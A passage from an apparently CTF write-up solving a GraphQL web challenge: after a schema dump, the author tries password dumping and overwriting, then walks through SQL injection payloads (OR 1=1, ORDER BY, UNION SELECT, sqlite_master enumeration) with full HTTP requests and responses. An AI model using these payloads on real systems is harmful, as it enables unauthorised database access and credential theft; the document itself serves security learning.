class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;User&#34;</span><span class="p">,</span><span class="nt">&#34;possibleTypes&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">},{</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;The `Int` scalar type represents non-fractional signed whole numeric values. Int can represent values between -(2^31) and 2^31 - 1. &#34;</span><span class="p">,</span><span class="nt">&#34;enumValues&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;fields&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;inputFields&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;interfaces&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;SCALAR&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;Int&#34;</span><span class="p">,</span><span class="nt">&#34;possibleTypes&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">},{</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;A cool post written by one of our users&#34;</span><span class="p">,</span><span class="nt">&#34;enumValues&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;fields&#34;</span><span class="p">:[{</span><span class="nt">&#34;args&#34;</span><span class="p">:[],</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;The writter of the post&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;author&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;OBJECT&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;User&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}},{</span><span class="nt">&#34;args&#34;</span><span class="p">:[],</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;The content os the post&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;content&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;SCALAR&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;String&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}},{</span><span class="nt">&#34;args&#34;</span><span class="p">:[],</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;The id of the post&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;id&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;NON_NULL&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;SCALAR&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;Int&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}}},{</span><span class="nt">&#34;args&#34;</span><span class="p">:[],</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;Image of the post&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;image&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;SCALAR&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;String&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}},{</span><span class="nt">&#34;args&#34;</span><span class="p">:[],</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;The name of the post&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;name&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;SCALAR&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;String&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}}],</span><span class="nt">&#34;inputFields&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;interfaces&#34;</span><span class="p">:[],</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;OBJECT&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;Post&#34;</span><span class="p">,</span><span class="nt">&#34;possibleTypes&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">},{</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;Object and Interface types are described by a list of Fields, each of which has a name, potentially a list of arguments, and a return type.&#34;</span><span class="p">,</span><span class="nt">&#34;enumValues&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;fields&#34;</span><span class="p">:[{</span><span class="nt">&#34;args&#34;</span><span class="p">:[],</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;args&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;NON_NULL&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;LIST&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;NON_NULL&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;OBJECT&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;__InputValue&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}}}}},{</span><span class="nt">&#34;args&#34;</span><span class="p">:[],</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;deprecationReason&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;SCALAR&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;String&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}},{</span><span class="nt">&#34;args&#34;</span><span class="p">:[],</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;description&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;SCALAR&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;String&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}},{</span><span class="nt">&#34;args&#34;</span><span class="p">:[],</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;isDeprecated&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;NON_NULL&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;SCALAR&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;Boolean&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}}},{</span><span class="nt">&#34;args&#34;</span><span class="p">:[],</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;name&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;NON_NULL&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;SCALAR&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;String&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}}},{</span><span class="nt">&#34;args&#34;</span><span class="p">:[],</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;type&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;NON_NULL&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;OBJECT&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;__Type&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}}}],</span><span class="nt">&#34;inputFields&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;interfaces&#34;</span><span class="p">:[],</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;OBJECT&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;__Field&#34;</span><span class="p">,</span><span class="nt">&#34;possibleTypes&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}]}}}</span>
</span></span></code></pre></div><p>Using GraphQL voyager, the schema can be visualized as follows:</p>
<p>&gt; <strong>Query</strong>:</p>
<p><div class="img-container"><img src="imgs/image-20210917195515613.png" alt="image-20210917195515613"  /></div>
</p>
<p>&gt; <strong>Mutation</strong></p>
<p><div class="img-container"><img src="imgs/image-20211009120159163.png" alt="image-20211009120159163"  /></div>
</p>
<p>From what I understand, Query and Mutation are just like Getter and Setter functions in Java or other Programming languages.</p>
<p>I tried to query the flag with <code>{&quot;query&quot;:&quot;{flag}&quot;}</code>, but it turned out a valid token for authentication is required. The next thing I tried was to see if I could dump out the author&rsquo;s password with the following query:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span><span class="nt">&#34;query&#34;</span><span class="p">:</span><span class="s2">&#34;{ posts {id  name author{username password}} }&#34;</span><span class="p">}</span> 
</span></span></code></pre></div><p>And I couldn&rsquo;t, the server returned with empty password.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">   <span class="nt">&#34;data&#34;</span><span class="p">:{</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&#34;posts&#34;</span><span class="p">:[</span>
</span></span><span class="line"><span class="cl">         <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nt">&#34;author&#34;</span><span class="p">:{</span>
</span></span><span class="line"><span class="cl">               <span class="nt">&#34;password&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">               <span class="nt">&#34;username&#34;</span><span class="p">:</span><span class="s2">&#34;congon4tor&#34;</span>
</span></span><span class="line"><span class="cl">            <span class="p">},</span>
</span></span><span class="line"><span class="cl">            <span class="nt">&#34;id&#34;</span><span class="p">:</span><span class="mi">1</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;Strawberry Cake&#34;</span>
</span></span><span class="line"><span class="cl">         <span class="p">},</span>
</span></span><span class="line"><span class="cl">         <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nt">&#34;author&#34;</span><span class="p">:{</span>
</span></span><span class="line"><span class="cl">               <span class="nt">&#34;password&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">               <span class="nt">&#34;username&#34;</span><span class="p">:</span><span class="s2">&#34;congon4tor&#34;</span>
</span></span><span class="line"><span class="cl">            <span class="p">},</span>
</span></span><span class="line"><span class="cl">            <span class="nt">&#34;id&#34;</span><span class="p">:</span><span class="mi">2</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;Grandma&#39;s Yeast Rolls&#34;</span>
</span></span><span class="line"><span class="cl">         <span class="p">},</span>
</span></span><span class="line"><span class="cl">         <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nt">&#34;author&#34;</span><span class="p">:{</span>
</span></span><span class="line"><span class="cl">               <span class="nt">&#34;password&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">               <span class="nt">&#34;username&#34;</span><span class="p">:</span><span class="s2">&#34;congon4tor&#34;</span>
</span></span><span class="line"><span class="cl">            <span class="p">},</span>
</span></span><span class="line"><span class="cl">            <span class="nt">&#34;id&#34;</span><span class="p">:</span><span class="mi">3</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;Blackberry-Orange Cake&#34;</span>
</span></span><span class="line"><span class="cl">         <span class="p">},</span>
</span></span><span class="line"><span class="cl">         <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nt">&#34;author&#34;</span><span class="p">:{</span>
</span></span><span class="line"><span class="cl">               <span class="nt">&#34;password&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">               <span class="nt">&#34;username&#34;</span><span class="p">:</span><span class="s2">&#34;congon4tor&#34;</span>
</span></span><span class="line"><span class="cl">            <span class="p">},</span>
</span></span><span class="line"><span class="cl">            <span class="nt">&#34;id&#34;</span><span class="p">:</span><span class="mi">4</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;Apple Pie&#34;</span>
</span></span><span class="line"><span class="cl">         <span class="p">}</span>
</span></span><span class="line"><span class="cl">      <span class="p">]</span>
</span></span><span class="line"><span class="cl">   <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>Then I tried to overwrite/update the user password with mutation functions (+ space in username, capital, etc), and it didn&rsquo;t work.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="err">##</span> <span class="err">Query</span> <span class="err">to</span> <span class="err">update</span> <span class="err">pass</span> 
</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="nt">&#34;query&#34;</span><span class="p">:</span><span class="s2">&#34;mutation {createUser (username: \&#34;Congon4tor\&#34;, password: \&#34;choropys\&#34;) {username password}}&#34;</span> <span class="p">}</span>  
</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="nt">&#34;query&#34;</span><span class="p">:</span><span class="s2">&#34;mutation {createUser (username: \&#34;congon4tor \&#34;, password: \&#34;choropys\&#34;) {username password}}&#34;</span> <span class="p">}</span>  
</span></span><span class="line"><span class="cl"><span class="err">##</span> <span class="err">Query</span> <span class="err">to</span> <span class="err">auth</span> <span class="err">and</span> <span class="err">grab</span> <span class="err">the</span> <span class="err">token</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="nt">&#34;query&#34;</span><span class="p">:</span><span class="s2">&#34;mutation {authenticateUser(username: \&#34;Congon4tor\&#34;, password: \&#34;choropys\&#34;) {token}}&#34;</span>
</span></span></code></pre></div><h4 id="sql-injection-in-graphql">SQL injection in GraphQL</h4>
<p>I started to re-enumerate* the web to find something I missed, and then I found a weird behavior in a post titled with <code>Grandma's Yeast Rolls</code>. Only the page for that post is a blank page.</p>
<blockquote>
<p>*Lesson learned: <strong>don&rsquo;t rush</strong></p>
</blockquote>
<p>When I looked at the server response in the dev tools, it was revealed that a single quote <code>'</code> in the post title broke the request.</p>
<p><div class="img-container"><img src="imgs/image-20210921025404405.png" alt="image-20210921025404405"  /></div>
</p>
<p>To validate that the site is vulnerable to SQLi,  I tried to send a single post request with the following query:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="nf">POST</span> <span class="nn">/graphql</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
</span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="o">:</span> <span class="l">challenge.ctf.games:30013</span>
</span></span><span class="line"><span class="cl"><span class="n">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0</span>
</span></span><span class="line"><span class="cl"><span class="n">Accept</span><span class="o">:</span> <span class="l">*/*</span>
</span></span><span class="line"><span class="cl"><span class="n">Accept-Language</span><span class="o">:</span> <span class="l">en-US,en;q=0.5</span>
</span></span><span class="line"><span class="cl"><span class="n">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate</span>
</span></span><span class="line"><span class="cl"><span class="n">content-type</span><span class="o">:</span> <span class="l">application/json</span>
</span></span><span class="line"><span class="cl"><span class="n">Origin</span><span class="o">:</span> <span class="l">http://challenge.ctf.games:32347</span>
</span></span><span class="line"><span class="cl"><span class="n">Content-Length</span><span class="o">:</span> <span class="l">68</span>
</span></span><span class="line"><span class="cl"><span class="n">Connection</span><span class="o">:</span> <span class="l">close</span>
</span></span><span class="line"><span class="cl"><span class="n">Cookie</span><span class="o">:</span> <span class="l">token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNob3JvcHlzIiwiZXhwIjoxNjMyMDYzNDEyLCJpYXQiOjE2MzE4OTA2MTIsImlzcyI6IkNvbmdvbjR0b3IifQ.mXLkQDZ5Oum3Bq8A4ZFHyNX9QmS0qhcBR8ph0-WfxmI</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="nt">&#34;query&#34;</span><span class="p">:</span><span class="s2">&#34;query { post(name:\&#34;Strawberry Cake\&#34;){ name }}&#34;</span><span class="p">}</span>  
</span></span></code></pre></div><p>The server responded with the expected result:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
</span></span><span class="line"><span class="cl"><span class="n">Content-Type</span><span class="o">:</span> <span class="l">application/json; charset=utf-8</span>
</span></span><span class="line"><span class="cl"><span class="n">Date</span><span class="o">:</span> <span class="l">Fri, 17 Sep 2021 19:58:11 GMT</span>
</span></span><span class="line"><span class="cl"><span class="n">Content-Length</span><span class="o">:</span> <span class="l">46</span>
</span></span><span class="line"><span class="cl"><span class="n">Connection</span><span class="o">:</span> <span class="l">close</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="nt">&#34;data&#34;</span><span class="p">:{</span><span class="nt">&#34;post&#34;</span><span class="p">:[{</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;Strawberry Cake&#34;</span><span class="p">}]}}</span>
</span></span></code></pre></div><p>When I changed the request to:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span><span class="nt">&#34;query&#34;</span><span class="p">:</span><span class="s2">&#34;query { post(name:\&#34;Grandma&#39; OR 1=1 --\&#34;){ name }}&#34;</span><span class="p">}</span>
</span></span></code></pre></div><p>It returned all the posts !</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
</span></span><span class="line"><span class="cl"><span class="n">Content-Type</span><span class="o">:</span> <span class="l">application/json; charset=utf-8</span>
</span></span><span class="line"><span class="cl"><span class="n">Date</span><span class="o">:</span> <span class="l">Fri, 17 Sep 2021 19:59:19 GMT</span>
</span></span><span class="line"><span class="cl"><span class="n">Content-Length</span><span class="o">:</span> <span class="l">134</span>
</span></span><span class="line"><span class="cl"><span class="n">Connection</span><span class="o">:</span> <span class="l">close</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="nt">&#34;data&#34;</span><span class="p">:{</span><span class="nt">&#34;post&#34;</span><span class="p">:[{</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;Strawberry Cake&#34;</span><span class="p">},{</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;Grandma&#39;s Yeast Rolls&#34;</span><span class="p">},{</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;Blackberry-Orange Cake&#34;</span><span class="p">},{</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;Apple Pie&#34;</span><span class="p">}]}}</span>
</span></span></code></pre></div><p>There are 6 columns.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="err">##</span> <span class="err">req</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span> <span class="nt">&#34;query&#34;</span><span class="p">:</span><span class="s2">&#34;query { post(name:\&#34;&#39; ORDER BY 1,2,3,4,5,6,7 -- \&#34;){ name }}&#34;</span><span class="p">}</span>  
</span></span><span class="line"><span class="cl"><span class="err">##</span> <span class="err">resp</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="nt">&#34;data&#34;</span><span class="p">:{</span><span class="nt">&#34;post&#34;</span><span class="p">:[]},</span><span class="nt">&#34;errors&#34;</span><span class="p">:[{</span><span class="nt">&#34;message&#34;</span><span class="p">:</span><span class="s2">&#34;7th ORDER BY term out of range - should be between 1 and 6&#34;</span><span class="p">,</span> <span class="nt">&#34;location&#34;</span><span class="p">:[{</span><span class="nt">&#34;line&#34;</span><span class="p">:</span><span class="mi">1</span><span class="p">,</span><span class="nt">&#34;column&#34;</span><span class="p">:</span><span class="mi">9</span><span class="p">}],</span> <span class="nt">&#34;path&#34;</span><span class="p">:[</span><span class="s2">&#34;post&#34;</span><span class="p">]}]}</span>
</span></span></code></pre></div><p>Injection point is on column 2</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="err">##</span> <span class="err">req</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="nt">&#34;query&#34;</span><span class="p">:</span><span class="s2">&#34;query { post(name:\&#34;&#39; UNION SELECT 1,2,3,4,5,6 -- \&#34;){ name }}&#34;</span><span class="p">}</span> 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="err">##</span> <span class="err">resp</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="nt">&#34;data&#34;</span><span class="p">:{</span><span class="nt">&#34;post&#34;</span><span class="p">:[{</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;2&#34;</span><span class="p">}]}}</span>
</span></span></code></pre></div><p>The DB version is SQLite 3.36.0.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="err">##</span> <span class="err">req</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="nt">&#34;query&#34;</span><span class="p">:</span><span class="s2">&#34;query { post(name:\&#34;&#39; UNION SELECT 1,sqlite_version(),3,4,5,6 -- \&#34;){ name }}&#34;</span><span class="p">}</span>  
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="err">##</span> <span class="err">resp</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="nt">&#34;data&#34;</span><span class="p">:{</span><span class="nt">&#34;post&#34;</span><span class="p">:[{</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;3.36.0&#34;</span><span class="p">}]}}</span>
</span></span></code></pre></div><p>There are two tables: <code>posts</code> and <code>users</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="err">##</span> <span class="err">req</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="nt">&#34;query&#34;</span><span class="p">:</span><span class="s2">&#34;query { post(name:\&#34;&#39; UNION SELECT 1,tbl_name ,3,4,5,6  FROM sqlite_master WHERE type=&#39;table&#39; and tbl_name NOT like &#39;sqlite_%&#39; -- \&#34;){ name }}&#34;</span><span class="p">}</span>  
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="err">##</span> <span class="err">resp</span>
